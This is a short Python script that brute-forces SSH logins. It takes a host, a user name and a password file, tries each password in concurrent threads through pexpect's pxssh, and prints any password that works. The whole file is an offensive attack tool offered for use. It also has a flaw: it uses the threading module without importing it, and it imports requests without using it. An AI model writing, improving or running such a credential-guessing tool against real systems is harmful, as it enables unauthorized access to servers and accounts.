import requests
import argparse
import time
from pexpect import pxssh

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()
def main():
    parser = argparse.ArgumentParser(description='Brute Force SSH')
    parser.add_argument('--host', dest='host', help='Host')
    parser.add_argument('--user', dest='user', help='User')
    parser.add_argument('--passwd', dest='passwd', help='Password File')
    args = parser.parse_args()
    host = args.host
    user = args.user
    passwd = args.passwd
    fn = open(passwd, 'r')
    for line in fn.readlines():
        if Found:
            print('[*] Exiting: Password Found')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: Too Many Socket Timeouts')
            exit(0)
        connection_lock.acquire()
        password = line.strip('\n')
        print('[-] Testing: ' + str(password))
        t = threading.Thread(target=connect, args=(host, user, password, True))
        t.start()
if __name__ == '__main__':
    main()